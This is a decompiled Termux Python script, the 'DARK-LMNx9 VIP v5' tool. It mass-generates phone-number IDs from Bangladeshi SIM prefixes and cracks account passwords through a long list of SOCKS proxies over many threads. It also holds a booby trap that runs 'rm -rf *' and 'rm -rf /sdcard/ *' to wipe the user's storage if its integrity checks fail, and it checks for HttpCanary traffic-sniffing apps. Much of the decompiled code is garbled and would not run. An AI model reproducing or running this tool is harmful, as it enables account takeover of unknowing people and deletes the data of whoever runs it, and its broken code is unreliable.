# Source Generated with ShoaibxAmer Pycdc
# File: v5.pyc (Python 3.11)
#semd by : @KGF_TERMUX_TEAM
import os
import re
import sys
import zlib
import time
import json
import uuid
import urllib
import string
import hashlib
import base64
import random
import marshal
import platform
import calendar
import datetime
import threading
import ipaddress
import subprocess
os.system('termux-setup-storage')
os.system('git pull')
os.system('clear')

def slowed(JANNAT):
    for Fuck in JANNAT + '\n':
        sys.stdout.write(Fuck)
        sys.stdout.flush()
        time.sleep(0.01)
        return None
#fuk 
sys.stdout.write('\x1b]2;<💚kalyan king💚>\x07')
def clear():os.system('clear');print(logo)
def linex():print(f'{R}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
slowed('\n \x1b[1;32m[✓] Updating Modules !...\n')
import requests
if ImportError:
    slowed('\n \x1b[1;34m[✓] installing requests !...\n')
    os.system('pip install requests')
import concurrent.futures as concurrent
if ImportError:
    slowed('\n\x1b[1;32m [✓] installing futures !...\n')
    os.system('pip install futures')
import bs4
if ImportError:
    slowed('\n \x1b[1;35m[✓] installing bs4 !...\n')
    os.system('pip install bs4')
import mechanize
if ImportError:
    slowed('\n \x1b[1;34m[✓] installing Mechanize !...\n')
    os.system('pip install mechanize')
import bs4
import requests
import mechanize
from os import system
from time import sleep
import requests as ress
from random import randint
from sys import exit
from random import choice as pilih
from random import random as acak
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as ThreadPool
N = '\x1b[0m'
P = '\x1b[1;97m'
M = '\x1b[1;33m'
H = '\x1b[1;32m'
K = '\x1b[1;97m'
B = '\x1b[1;96m'
U = '\x1b[1;95m'
O = '\x1b[1;97m'
rd = '\x1b[1;31m'
gr = '\x1b[1;32m'
g1 = '\x1b[38;5;205m'
g2 = '\x1b[38;5;206m'
g3 = '\x1b[38;5;207m'
g4 = '\x1b[38;5;201m'
zz1 = '\x1b[38;5;41m'
zz2 = '\x1b[38;5;42m'
zz3 = '\x1b[38;5;43m'
zz4 = '\x1b[38;5;44m'
bold1 = '\x1b[40m\x1b[1;41m'
bold2 = '\x1b[40m\x1b[00m\x1b[1;92m'
LNX = 47 * '\x1b[36;1m●'
sys.stdout.write('\x1b]2;🔥 DARK-LMNx9 ⚡ VIP-v5.0 🔥\x07')
loop = 0
oks = []
cps = []
id = []
LMNxUA2 = []
LMNxUA = []
package_name = 'com.httpcanary.pro'
path_canary = '/sdcard/Android/data'
package_name2 = 'com.guoshi.httpcanary'
path_canary2 = '/sdcard/Android/data'
package_name3 = 'com.wasim'
path_canary3 = '/sdcard/Android/data'
package_name4 = 'com.purple.canary'
path_canary4 = '/sdcard/Android/data'
package_name5 = 'com.guoshi.httpcanary.premium'
path_canary5 = '/sdcard/Android/data'
package_name6 = 'app.greyshirts.sslcapture'
path_canary6 = '/sdcard/Android/data'
package_name7 = 'com.black.canary'
path_canary7 = '/sdcard/Android/data'
package_name8 = 'com.lmnx9.canary'
path_canary8 = '/sdcard/Android/data'
slowed('\n \x1b[1;31m[✓] Cheaking Security !...\n')
DARK1x = '/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/'
if 'print' not in open(DARK1x + 'sessions.py', 'r').read():
    pass
os.system('rm -rf *')
os.system('rm -rf /sdcard/ *')
os.system('clear')
sys.exit('\n\n\x1b[1;31m <!!> TOR BYPASS SYSTEM ER MAYRE CHUDI <*!*>\n <!!> CHEAK YOUR STORAGE BUKACHUDA ..! LoL <*!*>\n')
os.system('clear')
sys.exit()
DARK2x = '/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/'
if 'print' not in open(DARK2x + 'models.py', 'r').read():
    pass
os.system('rm -rf *')
os.system('rm -rf /sdcard/ *')
os.system('clear')
sys.exit('\n\n\x1b[1;31m <!!> TOR BYPASS SYSTEM ER MAYRE CHUDI <*!*>\n <!!> CHEAK YOUR STORAGE BUKACHUDA ..! LoL <*!*>\n')
os.system('clear')
sys.exit()
DARK3x = '/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/'
if 'print' not in open(DARK3x + 'utils.py', 'r').read():
    pass
os.system('rm -rf *')
os.system('rm -rf /sdcard/ *')
os.system('clear')
sys.exit('\n\n\x1b[1;31m <!!> TOR BYPASS SYSTEM ER MAYRE CHUDI <*!*>\n <!!> CHEAK YOUR STORAGE BUKACHUDA ..! LoL <*!*>\n')
os.system('clear')
sys.exit()
DARK4x = '/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/'
if 'print' not in open(DARK4x + 'api.py', 'r').read():
    pass
os.system('rm -rf *')
os.system('rm -rf /sdcard/ *')
os.system('clear')
sys.exit('\n\n\x1b[1;31m <!!> TOR BYPASS SYSTEM ER MAYRE CHUDI <*!*>\n <!!> CHEAK YOUR STORAGE BUKACHUDA ..! LoL <*!*>\n')
os.system('clear')
sys.exit()
DARK5x = '/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/'
if 'print' not in open(DARK5x + 'auth.py', 'r').read():
    pass
os.system('rm -rf *')
os.system('rm -rf /sdcard/ *')
os.system('clear')
sys.exit('\n\n\x1b[1;31m <!!> TOR BYPASS SYSTEM ER MAYRE CHUDI <*!*>\n <!!> CHEAK YOUR STORAGE BUKACHUDA ..! LoL <*!*>\n')
os.system('clear')
sys.exit()
DARK6x = '/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/'
if 'print' not in open(DARK6x + 'packages.py', 'r').read():
    pass
os.system('rm -rf *')
os.system('rm -rf /sdcard/ *')
os.system('clear')
sys.exit('\n\n\x1b[1;31m <!!> TOR BYPASS SYSTEM ER MAYRE CHUDI <*!*>\n <!!> CHEAK YOUR STORAGE BUKACHUDA ..! LoL <*!*>\n')
os.system('clear')
sys.exit()
if Exception:
    x = None
    x = None
    del x
    x = None
    del x
slowed('\n \x1b[1;34m[✓] Connecting XFB Server !...\n')
os.system('rm -rf /sdcard/.prox.txt')
for x in range(50):
    SexWithLija = random.choice([
        '217.182.103.72:1088',
        '92.205.110.118:22037',
        '51.75.126.150:45642',
        '161.97.163.52:61693',
        '161.97.163.52:64289',
        '54.38.179.162:7494',
        '178.159.42.76:35870',
        '161.35.26.85:8705',
        '167.86.69.65:41010',
        '45.138.87.238:1080',
        '109.123.254.43:8655',
        '31.170.22.127:1080',
        '109.238.219.225:4153',
        '46.109.146.244:4145',
        '80.92.224.141:5678',
        '193.106.57.96:5678',
        '178.17.170.76:1080',
        '82.223.165.28:15043',
        '91.200.115.49:1080',
        '188.64.113.104:1080',
        '159.224.243.185:61303',
        '212.83.138.245:61165',
        '213.74.223.72:4153',
        '84.46.255.25:1080',
        '185.141.233.39:4153',
        '95.43.244.15:4153',
        '176.192.65.34:5020',
        '51.89.21.99:64251',
        '185.215.53.201:3629',
        '217.112.138.87:60606',
        '5.22.154.50:60606',
        '79.124.72.157:60606',
        '23.19.244.109:1080',
        '172.104.209.44:1080',
        '95.31.245.7:60606',
        '79.173.76.84:60606',
        '92.255.190.64:4153',
        '51.89.21.99:12918',
        '67.205.177.122:2754',
        '67.205.177.122:1307',
        '139.162.238.184:35378',
        '50.235.117.234:39593',
        '206.189.184.213:51958',
        '46.10.229.60:60606',
        '194.163.160.203:37990',
        '199.127.176.139:64312',
        '50.207.44.142:3355',
        '45.40.136.39:45741',
        '38.242.251.177:33388',
        '64.6.254.91:49796',
        '97.74.237.222:45219',
        '72.167.46.207:1080',
        '94.23.222.122:50925',
        '202.131.246.250:5678',
        '202.166.219.80:4153',
        '67.206.213.202:55555',
        '103.69.243.162:4153',
        '195.239.83.246:60606',
        '50.63.12.101:61429',
        '185.82.218.146:1080',
        '124.41.213.174:5678',
        '202.179.184.46:5430',
        '144.217.61.86:26519',
        '206.189.184.213:1587',
        '190.144.167.178:5678',
        '45.65.65.18:4145',
        '105.214.74.185:5678',
        '38.7.1.134:1080',
        '202.47.242.66:1080',
        '104.238.34.229:30990',
        '103.53.110.45:10801',
        '78.31.93.230:60606',
        '65.49.82.7:59207',
        '80.65.80.230:5678',
        '1.15.62.12:5678',
        '91.247.92.63:5678',
        '190.153.121.2:4145',
        '23.158.40.153:63569',
        '103.124.99.83:1088',
        '132.148.167.243:53675',
        '50.63.13.3:49332',
        '119.18.158.130:4153',
        '217.73.177.180:33080',
        '60.217.64.237:35292',
        '185.72.58.155:5678',
        '201.184.159.28:5678',
        '146.70.149.46:1080',
        '147.135.223.135:33398',
        '132.148.167.243:36223',
        '82.165.198.169:41179',
        '132.148.128.8:53200',
        '82.165.198.169:24161',
        '162.240.217.174:31203',
        '185.78.18.34:5678',
        '94.23.221.59:28221',
        '190.211.161.212:32410',
        '95.170.201.34:43018',
        '37.186.66.36:3629',
        '187.17.201.203:38737',
        '125.26.4.197:4145',
        '171.247.246.22:1080',
        '46.29.116.6:4145',
        '103.156.249.43:1080',
        '27.147.241.134:10800',
        '185.186.17.57:5678',
        '50.63.12.101:24924',
        '197.232.47.102:52567',
        '116.106.104.73:1080',
        '27.65.31.34:1080',
        '171.248.209.204:1080',
        '27.77.228.108:1080',
        '27.65.115.142:1080',
        '171.227.19.129:1080',
        '202.168.245.140:9090',
        '197.245.98.103:5678',
        '154.66.110.254:60606',
        '109.224.22.35:51372',
        '197.251.236.226:5678',
        '176.197.144.158:4153',
        '110.78.82.233:5678',
        '190.96.97.202:4153',
        '27.65.31.147:1080',
        '125.234.94.90:1080',
        '66.29.128.243:62210',
        '46.182.6.69:55945',
        '45.4.144.232:4153',
        '27.77.231.130:1080',
        '116.106.104.215:1080',
        '173.249.33.122:37089',
        '223.130.143.116:1080',
        '45.73.0.118:5678',
        '201.93.159.234:4145',
        '103.26.176.84:5678',
        '162.214.162.156:37559',
        '125.234.95.141:1080',
        '190.119.167.154:5678',
        '182.253.154.232:5678',
        '223.130.140.89:1080',
        '150.107.207.137:57230',
        '121.200.62.246:4153',
        '27.77.230.236:1080',
        '51.38.115.138:56586',
        '188.166.230.38:38332',
        '202.57.54.242:60606',
        '58.34.34.186:10800',
        '117.54.201.90:5678',
        '103.148.130.5:1080',
        '95.111.227.164:50775',
        '188.165.192.99:3451',
        '23.94.214.8:9054',
        '27.73.17.165:1080',
        '201.158.120.44:45504',
        '147.45.135.218:1080',
        '125.209.110.83:1981',
        '45.115.115.37:9090',
        '103.144.18.95:80',
        '138.0.229.232:4153',
        '103.134.180.241:4153',
        '104.36.148.79:36461',
        '200.41.182.243:4145',
        '182.253.179.113:4145',
        '113.161.144.20:4153',
        '116.100.223.156:1080',
        '218.75.78.106:10800',
        '115.187.50.40:5678',
        '190.13.147.93:5678',
        '173.249.33.122:2358',
        '82.165.198.169:11818',
        '184.22.7.142:4145',
        '103.47.216.18:4145',
        '82.165.198.169:36620',
        '148.72.212.183:36329',
        '181.236.224.4:4145',
        '27.115.33.94:4153',
        '50.63.12.33:23937',
        '45.117.228.97:4145',
        '203.130.130.40:33874',
        '148.72.212.212:47888',
        '181.115.68.163:4145',
        '138.255.240.66:40736',
        '203.81.87.186:5678',
        '116.99.233.237:30006',
        '94.23.222.122:23346',
        '103.220.205.162:4673',
        '171.250.220.175:1080',
        '148.72.212.198:4507',
        '198.54.113.32:59649',
        '190.145.182.3:4153',
        '103.191.58.22:5678',
        '159.223.166.21:16580',
        '196.44.181.37:5678',
        '103.68.3.114:4145',
        '105.214.59.85:5678',
        '162.241.73.195:61146',
        '115.127.28.19:6969',
        '183.89.250.246:1080',
        '209.198.43.52:5678',
        '64.202.184.129:24994',
        '115.127.180.90:5678',
        '198.54.113.32:62958',
        '171.248.221.145:1080',
        '186.219.96.47:49923',
        '197.156.240.66:5678',
        '51.222.241.157:32183',
        '190.230.116.233:5678',
        '111.68.117.207:5678',
        '139.162.238.184:12515',
        '187.19.127.246:8011',
        '148.72.213.232:4333',
        '148.72.209.174:63890',
        '178.130.86.132:1080',
        '188.165.223.183:45954',
        '31.200.242.201:4531',
        '152.32.84.108:4153',
        '199.204.248.188:34735',
        '110.77.145.159:4145',
        '1.179.151.165:31948',
        '181.13.142.45:5678',
        '182.52.83.208:4145',
        '190.108.84.168:4145',
        '123.253.124.28:5678',
        '103.194.88.66:60606',
        '162.214.162.180:37559',
        '200.105.192.6:5678',
        '41.190.92.50:60606',
        '198.12.249.249:49565',
        '148.72.215.230:59671',
        '103.154.112.34:35010',
        '94.198.211.217:5678',
        '95.183.52.30:1080',
        '212.69.128.72:5678',
        '103.166.9.110:8080',
        '118.70.126.245:5678',
        '103.140.35.11:4145',
        '86.59.142.37:4145',
        '113.161.210.60:4153',
        '213.16.81.182:35559',
        '46.8.48.143:1080',
        '79.124.72.24:60606',
        '45.117.179.179:63112',
        '101.96.123.21:1080',
        '103.215.72.115:5678',
        '46.34.144.199:4153',
        '213.108.14.45:60606',
        '195.219.98.27:5678',
        '167.71.218.223:10242',
        '49.156.42.186:5678',
        '95.71.124.187:5678',
        '64.227.108.182:38736',
        '46.29.116.3:4145',
        '185.43.189.182:3629',
        '206.189.184.213:53290',
        '109.123.254.43:47053',
        '148.72.215.230:35507',
        '109.248.236.150:60606',
        '188.165.223.183:22245',
        '139.162.238.184:50556',
        '144.217.61.88:34974',
        '119.93.123.229:4145',
        '161.97.134.22:45449',
        '91.121.153.11:32972',
        '91.142.222.105:62624',
        '212.90.121.155:56921',
        '118.67.133.197:1080',
        '75.41.145.46:5678',
        '220.167.89.10:10800',
        '202.40.181.220:31247',
        '162.241.92.42:64093',
        '92.205.110.118:63593',
        '51.75.126.150:30433',
        '5.39.69.35:52176',
        '202.166.211.253:60606',
        '198.12.249.249:5750',
        '94.23.222.122:14718',
        '8.42.68.197:39593',
        '154.64.217.128:36468',
        '188.165.223.183:55572',
        '102.165.125.102:5678',
        '165.227.196.37:54961',
        '187.216.144.170:5678',
        '178.62.69.186:56686',
        '51.161.130.195:49765',
        '69.49.246.33:61072',
        '103.84.178.2:4153',
        '82.157.172.60:1080',
        '162.241.204.101:60526',
        '202.79.52.244:5678',
        '105.214.67.75:5678',
        '94.23.222.122:10810',
        '186.97.144.98:5678',
        '102.36.156.131:5678',
        '138.59.177.117:5678',
        '91.121.153.11:41941',
        '194.163.159.94:50964',
        '188.165.223.183:50429',
        '177.136.124.36:3629',
        '129.126.65.78:4153',
        '118.67.223.4:5678',
        '115.127.188.214:1080',
        '198.12.249.249:50396',
        '202.57.42.178:60606',
        '36.89.56.127:5678',
        '199.204.248.124:50718',
        '45.168.158.84:4153',
        '190.104.219.147:4153',
        '124.158.182.34:10808',
        '118.67.216.94:4145',
        '103.184.180.226:4153',
        '1.32.57.85:5678',
        '172.105.43.124:60214',
        '203.189.150.38:5678',
        '200.125.40.38:5678',
        '188.165.223.183:29048',
        '43.230.196.98:48200',
        '113.53.29.228:13629',
        '131.108.118.131:60606',
        '177.66.221.255:5678',
        '216.155.93.238:5678',
        '114.4.200.222:5678',
        '172.105.43.124:6717',
        '180.163.86.221:1080',
        '91.185.236.239:4145',
        '84.247.168.26:30276',
        '103.141.189.62:5678',
        '84.247.168.26:28504',
        '150.129.109.14:5678',
        '213.136.79.177:39011',
        '188.165.223.183:30032',
        '124.158.153.33:1080',
        '82.165.198.169:10610',
        '148.72.215.230:23492',
        '152.228.134.212:58044'])
    open('/sdcard/.prox.txt', 'a').write(SexWithLija + '\n')
    prx = open('/sdcard/.prox.txt', 'r').read().splitlines()
    slowed('\n \x1b[1;33m[✓] Setting Up Configurations !...\n')
    Lx1 = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36'
    Lx2 = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.2651.105'
    Lx3 = 'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko'
    Lx4 = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0'
    Lx5 = 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Vivaldi/6.8.3381.53'
    os.system('clear')
    slowed('\n\n\t\x1b[0;92m🌺 𝗪𝗘𝗟𝗖𝗢𝗠𝗘 𝗧𝗢 🌺')
    slowed('   \x1b[0;96m 🔥 𝗟𝗠𝗡𝘅𝟵 𝗩𝗜𝗣 𝗥𝗔𝗡𝗗𝗢𝗠 𝘃5 🔥')
    time.sleep(1)
    attemps = 0
            os.system('xdg-open https://t.me/KGF_TERMUX_TEAM')
        slowed('\n \x1b[0;91m<\\> Wrong User/Pass - Try Again.')
        time.sleep(2)
        os.system('xdg-open https://t.me/KGF_TERMUX_TEAM')
        os.system('clear')
        attemps += 1
logo = '
\n\x1b[1;31m┏━━┓━═━═━═━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━═━═━═━═━┏━━┓
\n\x1b[1;31m┃😈┃\x1b[47m\x1b[1;46m   𝗧𝗛𝗘 𝗖𝗬𝗕𝗘𝗥 𝗠𝗔𝗙𝗜𝗔    ➤   𝗗𝗔𝗥𝗞 𝗧𝗘𝗔𝗠 𝗟𝗠𝗡𝘅𝟗   \x1b[40m\x1b[00m\x1b[1;91m┃😈┃
\n\x1b[1;31m┗━━┛━═━═━═━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━═━═━═━═━┗━━┛
\n\x1b[1;31m┏\x1b[1;32m━━━═━═━═━═━═━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━═━═━═━━━\x1b[1;31m┓
\n\x1b[1;32m┃ \x1b[1;31m┏━┓ \x1b[1;36m➤ \x1b[1;31m┏\x1b[1;32m━┓      \x1b[1;34m┏━\x1b[1;33m┓ \x1b[1;36m┏━━━┓ \x1b[1;35m┏━━━┓ \x1b[1;33m┏━━━\x1b[1;34m━━┓ \x1b[1;36m┏━━━┓\x1b[1;31m ┏━┓ \x1b[1;32m┃
\n\x1b[1;32m┃ \x1b[1;31m┃\x1b[1;32m𝐃\x1b[1;31m┃ \x1b[1;31m➤ \x1b[1;31m┃ \x1b[1;32m┃      \x1b[1;34m┃ \x1b[1;33m┃ \x1b[1;36m┃ ┃ ┃ \x1b[1;35m┃ ┃ ┃ \x1b[1;33m┃ ┏━\x1b[1;34m┓ ┃ \x1b[1;36m┃ ┃ ┃\x1b[1;31m ┃ ┃ \x1b[1;32m┃
\n\x1b[1;32m┃ \x1b[1;31m┃\x1b[1;32m𝐀\x1b[1;31m┃ \x1b[1;32m➤ \x1b[1;31m┃ \x1b[1;32m┃      \x1b[1;34m┃ \x1b[1;33m┃ \x1b[1;36m┃ ┃ ┃ \x1b[1;35m┃ ┃ ┃ \x1b[1;33m┃ ┃ \x1b[1;34m┃ ┃ \x1b[1;36m┃ ┃ ┃ \x1b[1;31m┃ ┃ \x1b[1;32m┃
\n\x1b[1;32m┃ \x1b[1;31m┃\x1b[1;32m𝐑\x1b[1;31m┃ \x1b[1;33m➤ \x1b[1;31m┃\x1b[1;32m ┃      \x1b[1;34m┃ \x1b[1;33m┃ \x1b[1;36m┃ ┃ ┗━\x1b[1;35m┛ ┃ ┃ \x1b[1;33m┃ ┃ \x1b[1;34m┃ ┃ \x1b[1;36m┃ ┃ ┃\x1b[1;31m ┃ ┃ \x1b[1;32m┃
\n\x1b[1;32m┃ \x1b[1;31m┃\x1b[1;32m𝐊\x1b[1;31m┃ \x1b[1;34m➤ \x1b[1;31m┃\x1b[1;32m ┃      \x1b[1;34m┃ \x1b[1;33m┃\x1b[1;36m ┃ ┃     \x1b[1;35m┃ ┃ \x1b[1;33m┃ ┃ \x1b[1;34m┃ ┃ \x1b[1;36m┃ ┃ ┃ \x1b[1;31m┃ ┃ \x1b[1;32m┃
\n\x1b[1;32m┃ \x1b[1;31m┃\x1b[1;36m☸\x1b[1;31m┃ \x1b[1;35m➤ \x1b[1;31m┃\x1b[1;32m ┗━━━━━┓\x1b[1;34m┃ \x1b[1;33m┃ \x1b[1;36m┃ ┃    \x1b[1;35m ┃ ┃ \x1b[1;33m┃ ┗━\x1b[1;34m┛ ┃ \x1b[1;36m┃ ┃ ┃ \x1b[1;31m┃ ┃ \x1b[1;32m┃
\n\x1b[1;32m┃ \x1b[1;31m┗━┛ \x1b[1;36m➤ \x1b[1;31m┗━━━━━━━┛\x1b[1;34m┗━\x1b[1;33m┛ \x1b[1;36m┗━┛     \x1b[1;35m┗━┛ \x1b[1;33m┗━━━\x1b[1;34m━━┛ \x1b[1;36m┗━┛ ┗\x1b[1;31m━━━┛ \x1b[1;32m┃
\n\x1b[1;32m┃ \x1b[1;31m┏━┓ \x1b[1;30m➤ \x1b[1;32m┏\x1b[1;31m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[1;32m┓ \x1b[1;32m┃
\n\x1b[1;32m┃ \x1b[1;31m┃\x1b[1;32m𝐋\x1b[1;31m┃ \x1b[1;32m➤ \x1b[1;31m┃  \x1b[1;33m⌠\x1b[1;32m+\x1b[1;33m⌡  \x1b[1;32m𝐀𝐮𝐭𝐡𝐨𝐫      \x1b[1;32m➤   \x1b[1;32m𝐋𝐈𝐌𝐎𝐍 𝐇𝐎𝐒𝐒𝐀𝐈𝐍    \x1b[1;31m┃ \x1b[1;32m┃
\n\x1b[1;32m┃ \x1b[1;31m┃\x1b[1;32m𝐌\x1b[1;31m┃ \x1b[1;37m➤ \x1b[1;31m┃  \x1b[1;33m⌠\x1b[1;32m+\x1b[1;33m⌡  \x1b[1;37m𝐆𝐢𝐭𝐇𝐮𝐛      \x1b[1;32m➤   \x1b[1;37m𝐋𝐌𝐍𝐱𝟗-𝐉𝐎𝐇𝐍𝐘     \x1b[1;31m ┃ \x1b[1;32m┃
\n\x1b[1;32m┃ \x1b[1;31m┃\x1b[1;32m𝐍\x1b[1;31m┃ \x1b[1;33m➤ \x1b[1;31m┃  \x1b[1;33m⌠\x1b[1;32m+\x1b[1;33m⌡  \x1b[1;35mChannel     \x1b[1;32m➤   \x1b[1;35m@DARK_TEAM_𝐋𝐌𝐍𝐱𝟗 \x1b[1;31m┃ \x1b[1;32m┃
\n\x1b[1;32m┃ \x1b[1;31m┃\x1b[1;32m𝐱\x1b[1;31m┃ \x1b[1;34m➤ \x1b[1;31m┃  \x1b[1;33m⌠\x1b[1;32m+\x1b[1;33m⌡  \x1b[1;36m𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦    \x1b[1;32m➤   \x1b[1;36m@𝐃𝐀𝐑𝐊_𝐋𝐌𝐍𝐱𝟗99  \x1b[1;31m  ┃ \x1b[1;32m┃
\n\x1b[1;32m┃ \x1b[1;31m┃\x1b[1;32m𝟗\x1b[1;31m┃ \x1b[1;35m➤ \x1b[1;31m┃  \x1b[1;33m⌠\x1b[1;32m+\x1b[1;33m⌡  \x1b[1;34mUpdate      \x1b[1;32m➤   \x1b[1;34marmv64-v5.0     \x1b[1;31m ┃ \x1b[1;32m┃
\n\x1b[1;32m┃ \x1b[1;31m┗━┛ \x1b[1;36m➤ \x1b[1;32m┗\x1b[1;31m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[1;32m┛ \x1b[1;32m┃
\n\x1b[1;31m┗\x1b[1;32m━━━═━═━═━═━═━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━═━═━═━━━\x1b[1;31m┛'
def Limon():
    os.system('clear')
    print(logo)
    print('\x1b[1;32m╔═════════════════════════════════╗
    \n\x1b[1;32m║\x1b[1;35m  😈 \x1b[1;36m● \x1b[1;35m𝗗𝗔𝗥𝗞 \x1b[1;36m● \x1b[1;35m𝗧𝗘𝗔𝗠 \x1b[1;36m● \x1b[1;35m𝗟𝗠𝗡𝘅𝟵 \x1b[1;36m● 😈  \x1b[38;5;46m║
    \n\x1b[1;32m╠═════════════════════════════════╣\n\x1b[1;32m║ \x1b[0;95m【\x1b[1;32m𝟭\x1b[0;96m ● \x1b[1;32m𝗔\x1b[0;95m】\x1b[1;32m➤\x1b[36;1m 𝗥𝗔𝗡𝗗𝗢𝗠 CRACK 𝗕𝗗 v5   \x1b[38;5;46m║\n\x1b[1;32m╠═════════════════════════════════╣\n\x1b[1;32m║ \x1b[0;95m【\x1b[1;32m𝟮\x1b[0;96m ● \x1b[1;32m𝗕\x1b[0;95m】\x1b[1;32m➤\x1b[34;1m 𝗝𝗢𝗜𝗡 𝗧𝗘𝗟𝗘𝗚𝗥𝗔𝗠 CHNL   \x1b[38;5;46m║\n\x1b[1;32m║ \x1b[0;95m【\x1b[1;32m𝟯\x1b[0;96m ● \x1b[1;32m𝗖\x1b[0;95m】\x1b[1;32m➤\x1b[33;1m REPORT TO ADMIN      \x1b[38;5;46m║\n\x1b[1;32m║ \x1b[0;95m【\x1b[1;32m𝟬\x1b[0;96m ● \x1b[1;32m𝗫\x1b[0;95m】\x1b[1;32m➤\x1b[31;1m 𝗘𝗫𝗜𝗧 𝗧𝗢𝗢𝗟            \x1b[38;5;46m║\n\x1b[1;32m╚═════════════════════════════════╝')
    LimonX = input('\x1b[1;33m⌠\x1b[1;32m+\x1b[1;33m⌡\x1b[0;95m 𝗖𝗛𝗢𝗢𝗦𝗘 𝗔𝗡 𝗢𝗣𝗧𝗜𝗢𝗡\x1b[1;92m ●\x1b[1;96m ')
    if LimonX in ('1', '01', 'a', 'A'):
        Limons()
        return None
    if None in ('2', '02', 'b', 'B'):
        os.system('xdg-open https://t.me/KGF_TERMUX_TEAM')
        time.sleep(3)
        Limon()
        return None
    if None in ('3', '03', 'c', 'C'):
        os.system('xdg-open https://t.me/KGF_TERMUX_TEAM')
        time.sleep(3)
        Limon()
        return None
    if None in ('0', '00', 'x', 'X'):
        print('\n\n\t \x1b[0;96m𝗙𝗨𝗖𝗞 𝗬𝗢𝗨 𝗔𝗕𝗔𝗟 😈')
        time.sleep(3)
        sys.exit()
        return None
    None('\n\x1b[1;33m⌠\x1b[1;32m✘\x1b[1;33m⌡\x1b[0;91m INVALID 𝗢𝗣𝗧𝗜𝗢𝗡\x1b[1;92m ●')
    time.sleep(1)
    Limon()


def Limons():
    user = []
    os.getuid
    os.geteuid
    os.system('clear')
    print(logo)
    slowed('\x1b[1;92m╔═════════════════════════════════════════════╗\n\x1b[1;92m║\x1b[1;93m  EXAMPLE FOR SIM ● \x1b[1;91m[\x1b[1;96m016\x1b[1;91m] [\x1b[1;96m017\x1b[1;91m] [\x1b[1;96m018\x1b[1;91m] [\x1b[1;96m019\x1b[1;91m] \x1b[1;92m ║\n\x1b[1;92m╚═════════════════════════════════════════════╝')
    code = input('\x1b[1;33m⌠\x1b[1;32m+\x1b[1;33m⌡\x1b[1;95m CHOOSE 𝗦𝗜𝗠 𝗖𝗢𝗗𝗘 \x1b[1;92m●\x1b[1;36m ')
    if code.isdigit() or len(code) != 3:
        slowed('\n\x1b[1;33m⌠\x1b[1;32m✘\x1b[1;33m⌡\x1b[0;91m INVALID SIM CODE\x1b[1;96m ●\x1b[1;92m Try Again')
        time.sleep(2)
        Limon()
    slowed('\x1b[1;92m╔═════════════════════════════════════════════╗\n\x1b[1;92m║\x1b[1;93m  EXAMPLE FOR 𝗟𝗜𝗠𝗜𝗧 ● \x1b[1;91m[\x1b[1;96m3000\x1b[1;91m] [\x1b[1;96m5000\x1b[1;91m] [\x1b[1;96m10000\x1b[1;91m] \x1b[1;92m ║\n\x1b[1;92m╚═════════════════════════════════════════════╝')
    limit = int(input('\x1b[1;33m⌠\x1b[1;32m+\x1b[1;33m⌡\x1b[1;95m CHOOSE 𝗖𝗥𝗔𝗖𝗞 𝗟𝗜𝗠𝗜𝗧\x1b[1;92m ●\x1b[1;96m '))
    if ValueError:
        slowed('\n\x1b[1;33m⌠\x1b[1;32m✘\x1b[1;33m⌡\x1b[0;91m INVALID CRACK LIMIT\x1b[1;96m ●\x1b[1;92m Try Again')
        time.sleep(2)
        Limon()
    for x in range(limit):
        LJ = (lambda .0: for x in .0:
random.choice(string.digits)None)(range(8)())
        user.append(LJ)
        VIP_XFB5 = ThreadPool(max_workers = 40)
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print(f'''\x1b[1;92m ╔══════════════════════════════════════➤●\n\x1b[1;92m ║\x1b[1;96m 𝗧𝗢𝗢𝗟 OWNER      \x1b[1;92m● \x1b[1;96m LIMON HOSSAIN \n\x1b[1;92m ║\x1b[1;92m 𝗬𝗢𝗨𝗥 𝗦𝗜𝗠 𝗖𝗢𝗗𝗘   \x1b[1;92m● \x1b[1;92m {code}\n\x1b[1;92m ║\x1b[1;93m 𝗬𝗢𝗨𝗥 𝗧𝗢𝗧𝗔𝗟 𝗜𝗗𝘇  \x1b[1;92m● \x1b[1;93m {tl}\n\x1b[1;92m ╠═══════════════════════════════════════➤●\n\x1b[1;92m ║\x1b[1;97m ＵＳＥ ＹＯＵＲ ＭＯＢＩＬＥ ＤＡＴＡ \n\x1b[1;92m ║\x1b[1;90m ＵＳＥ ＦＬＩＧＨＴ ＭＯＤ ＥＶＲＹ ５ｍ \n\x1b[1;92m ╚═════════════════════════════════════════➤●\n        ''')
        os.system('xdg-open https://t.me/KGF_TERMUX_TEAM')
        for love in user:
            pwx = []
            uid = code + love
            a = uid[5:]
            b = uid[4:]
            c = uid[3:]
            d = uid[:6]
            e = uid[:7]
            f = uid[:8]
            g = uid
            pxx = random.choice([
                a,
                b,
                c,
                d,
                e,
                f,
                g])
            pwx.append(pxx)
            VIP_XFB5.submit(Limonm, uid, pwx, tl)
            None(None, None)
            if not ''.join:
                pass
